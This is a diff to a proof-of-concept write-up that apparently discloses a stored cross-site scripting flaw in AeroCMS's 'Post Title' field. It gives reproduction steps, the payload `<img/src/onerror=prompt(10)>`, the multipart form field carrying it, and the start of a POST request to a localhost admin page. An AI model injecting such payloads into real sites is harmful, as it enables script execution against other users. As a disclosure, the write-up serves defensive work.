@@ -1,4 +1,5 @@
 # AeroCMS-Add_Posts-Stored_XSS-Poc
+* Description => Stored_XSS at `Post Title`
 ## Step to Reproduct
 * Login to admin panel -> `Posts` -> `Add Posts` -> `Post Title` -> inject payload `<img/src/onerror=prompt(10)>` -> The XSS will trigger when clicked `Edit Post` button
 ## Exploit
@@ -13,6 +14,14 @@ When inserting into the database, the input is not filtered out of html characte
 Even when displaying, the entity cannot be properly encoded
 -------------------------------------------------------------
 # POC
+* `Injection Point`
+```c
+-----------------------------85448121341942511952219062291
+Content-Disposition: form-data; name="post_title"
+
+<img/src/onerror=prompt(10)>
+```
+* Request
 ```c POST http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=26 HTTP/1.1
 Host: localhost:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
